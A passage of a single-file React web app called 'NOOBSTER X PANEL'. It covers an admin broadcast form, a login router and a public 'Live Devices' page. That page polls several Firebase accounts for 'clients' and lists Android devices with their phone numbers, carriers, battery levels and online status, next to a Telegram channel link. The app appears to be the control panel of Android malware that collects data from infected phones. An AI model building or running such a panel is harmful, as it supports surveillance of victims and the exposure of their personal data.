                                        value={broadcastMsg}
                                        onChange={e => setBroadcastMsg(e.target.value)}
                                        rows={4}
                                        placeholder="Type your broadcast message..."
                                        style={{ resize: "vertical" }}
                                    />
                                    <div style={{ display: "flex", gap: "10px", marginTop: "12px" }}>
                                        <button className="btn btn-primary" onClick={sendBroadcast}>
                                            <Icon name="send" size={14} /> Send Broadcast
                                        </button>
                                        <button className="btn btn-secondary" onClick={() => { setBroadcastMsg(""); setPanelStatus({ ...panelStatus, broadcast: "" }); setPanelStatusState({ ...panelStatus, broadcast: "" }); }}>
                                            Clear
                                        </button>
                                    </div>
                                    {panelStatus.broadcast && (
                                        <div style={{ marginTop: "16px", padding: "12px", background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", borderRadius: "10px" }}>
                                            <p style={{ fontSize: "11px", color: "#fbbf24", fontWeight: 600, marginBottom: "4px" }}>📢 Active Broadcast:</p>
                                            <p style={{ fontSize: "12px", color: "#ddd" }}>{panelStatus.broadcast}</p>
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}
                    </main>
                </div>
            );
        }

        // ============================================================
        // PUBLIC PANEL (simplified version)
        // ============================================================
        function PublicPanel({ onAdminClick }) {
            const panelStatus = useMemo(() => getPanelStatus(), []);
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(true);

            useEffect(() => {
                const load = async () => {
                    if (!panelStatus.online) { setLoading(false); return; }
                    setLoading(true);
                    const accounts = getFirebaseAccounts();
                    const all = [];
                    await Promise.all(accounts.map(async (acc) => {
                        try {
                            const data = await firebaseFetch(acc.url, acc.key, "clients");
                            const devs = parseDevices(data);
                            devs.forEach(d => {
                                d._accountName = acc.name;
                            });
                            all.push(...devs);
                        } catch (e) { /* skip */ }
                    }));
                    setDevices(all);
                    setLoading(false);
                };
                load();
                const iv = setInterval(load, 20000);
                return () => clearInterval(iv);
            }, [panelStatus.online]);

            if (!panelStatus.online) {
                return (
                    <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" }}>
                        <div className="glass" style={{ borderRadius: "24px", padding: "48px 32px", maxWidth: "420px", textAlign: "center" }}>
                            <div style={{ width: "80px", height: "80px", borderRadius: "24px", background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)", display: "inline-flex", alignItems: "center", justifyContent: "center", marginBottom: "20px" }}>
                                <Icon name="alert" size={36} color="#f87171" />
                            </div>
                            <h1 style={{ fontSize: "24px", fontWeight: 900, color: "#f87171", marginBottom: "8px" }}>Server Offline</h1>
                            <p style={{ fontSize: "14px", color: "#888", lineHeight: 1.6 }}>
                                The panel is currently under maintenance. Please try again later.
                            </p>
                            {panelStatus.broadcast && (
                                <div style={{ marginTop: "20px", padding: "14px", background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", borderRadius: "12px", textAlign: "left" }}>
                                    <p style={{ fontSize: "11px", color: "#fbbf24", fontWeight: 600, marginBottom: "4px" }}>📢 Message from Admin:</p>
                                    <p style={{ fontSize: "13px", color: "#ddd" }}>{panelStatus.broadcast}</p>
                                </div>
                            )}
                            <button className="btn btn-secondary" onClick={onAdminClick} style={{ marginTop: "24px" }}>
                                <Icon name="shield" size={14} /> Admin Login
                            </button>
                        </div>
                    </div>
                );
            }

            return (
                <div style={{ minHeight: "100vh" }}>
                    {/* Header */}
                    <header style={{ position: "sticky", top: 0, zIndex: 40, background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a" }}>
                        <div style={{ maxWidth: "1400px", margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: "16px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <div style={{ width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" }}>
                                    <Icon name="zap" size={16} color="#fff" />
                                </div>
                                <span style={{ fontSize: "16px", fontWeight: 800 }}>
                                    <span style={{ color: "#6acfff" }}>NOOBSTER</span> X PANEL
                                </span>
                            </div>
                            <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: "12px" }}>
                                <span className="badge badge-green">
                                    <span className="pulse-dot" /> LIVE
                                </span>
                                <a href={TELEGRAM_CHANNEL} target="_blank" rel="noopener" className="btn btn-secondary" style={{ padding: "8px 14px", fontSize: "12px" }}>
                                    <Icon name="send" size={14} /> Telegram
                                </a>
                                <button className="btn btn-secondary" onClick={onAdminClick} style={{ padding: "8px 14px", fontSize: "12px" }}>
                                    <Icon name="shield" size={14} />
                                </button>
                            </div>
                        </div>
                    </header>

                    {/* Broadcast banner */}
                    {panelStatus.broadcast && (
                        <div style={{ background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", padding: "10px 24px", textAlign: "center", fontSize: "13px", color: "#fbbf24" }}>
                            📢 {panelStatus.broadcast}
                        </div>
                    )}

                    <main style={{ maxWidth: "1400px", margin: "0 auto", padding: "24px" }}>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "20px" }}>
                            <div>
                                <h1 style={{ fontSize: "20px", fontWeight: 800 }}>Live Devices</h1>
                                <p style={{ fontSize: "12px", color: "#666", marginTop: "2px" }}>{devices.length} devices across {getFirebaseAccounts().length} Firebase accounts</p>
                            </div>
                            <div style={{ display: "flex", gap: "8px" }}>
                                <span className="badge badge-green">{devices.filter(d => d.status).length} Online</span>
                                <span className="badge badge-red">{devices.filter(d => !d.status).length} Offline</span>
                            </div>
                        </div>

                        {loading ? (
                            <div style={{ textAlign: "center", padding: "60px 20px", color: "#555" }}>
                                <div className="spinner" style={{ margin: "0 auto 12px", width: "24px", height: "24px", borderWidth: "3px" }} />
                                Loading devices...
                            </div>
                        ) : devices.length === 0 ? (
                            <div className="card" style={{ textAlign: "center", padding: "60px 20px" }}>
                                <Icon name="wifi" size={40} color="#2a2a2a" style={{ margin: "0 auto 12px" }} />
                                <p style={{ color: "#555", fontSize: "14px" }}>No devices connected</p>
                                <p style={{ color: "#333", fontSize: "12px", marginTop: "4px" }}>Waiting for devices to register...</p>
                            </div>
                        ) : (
                            <div className="grid grid-2">
                                {devices.map(d => (
                                    <div key={d.id + d._accountName} className="device-card">
                                        <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "10px" }}>
                                            <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: d.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: `1px solid ${d.status ? "rgba(34,197,94,0.25)" : "#262626"}`, display: "flex", alignItems: "center", justifyContent: "center" }}>
                                                <Icon name="wifi" size={16} color={d.status ? "#4ade80" : "#444"} />
                                            </div>
                                            <div style={{ flex: 1, minWidth: 0 }}>
                                                <div style={{ fontSize: "13px", fontWeight: 700, color: "#fff", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.name}</div>
                                                <div style={{ fontSize: "10px", fontFamily: "monospace", color: "#555", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.id}</div>
                                            </div>
                                            <span className={`badge ${d.status ? "badge-green" : "badge-red"}`} style={{ fontSize: "10px" }}>
                                                {d.status ? "Online" : "Offline"}
                                            </span>
                                        </div>
                                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px", fontSize: "11px" }}>
                                            <div>
                                                <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", marginBottom: "2px" }}>Android</div>
                                                <div style={{ color: "#ccc", fontWeight: 600 }}>{d.android !== "—" ? `v${d.android}` : "—"}</div>
                                            </div>
                                            <div>
                                                <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", marginBottom: "2px" }}>Battery</div>
                                                <div style={{ color: d.batteryPercent >= 60 ? "#4ade80" : d.batteryPercent >= 30 ? "#fbbf24" : "#f87171", fontWeight: 600 }}>{d.battery}</div>
                                            </div>
                                            <div>
                                                <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", marginBottom: "2px" }}>Phone</div>
                                                <div style={{ color: "#aaa", fontFamily: "monospace", fontSize: "11px" }}>{d.phoneNumber}</div>
                                            </div>
                                            <div>
                                                <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", marginBottom: "2px" }}>Network</div>
                                                <div style={{ color: "#aaa" }}>{d.provider}</div>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </main>
                </div>
            );
        }

        // ============================================================
        // MAIN APP ROUTER
        // ============================================================
        function App() {
            const [adminSession, setAdminSession] = useState(() => Store.get(STORAGE_KEYS.adminSession, null));
            const [showAdminLogin, setShowAdminLogin] = useState(false);
            const { toasts, push } = useToast();

            // Check if admin URL param
            useEffect(() => {
                const params = new URLSearchParams(window.location.search);
                if (params.get("admin") === "1" || window.location.hash === "#admin") {
                    setShowAdminLogin(true);
                }
            }, []);

            const handleAdminLogin = () => {
                setAdminSession(Store.get(STORAGE_KEYS.adminSession, null));
                setShowAdminLogin(false);
            };

            const handleAdminLogout = () => {
                Store.del(STORAGE_KEYS.adminSession);
                setAdminSession(null);
                setShowAdminLogin(false);
            };

            let view;
            if (showAdminLogin && !adminSession?.loggedIn) {
                view = <AdminLogin onSuccess={handleAdminLogin} />;
            } else if (adminSession?.loggedIn) {
                view = <AdminDashboard onLogout={handleAdminLogout} toast={push} />;
            } else {
                view = <PublicPanel onAdminClick={() => setShowAdminLogin(true)} />;
            }

            return (
                <>
                    {view}
                    {toasts.map(t => (
                        <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>
                    ))}
                </>
            );
        }

        ReactDOM.createRoot(document.getElementById("root")).render(<App />);

        // Auto-hide telegram popup after 12 seconds if not clicked
        setTimeout(() => {
            const p = document.getElementById('telegramPopup');
            if (p) p.style.display = 'none';
        }, 12000);
    </script>

    <!-- React CDN -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
</body>
</html>
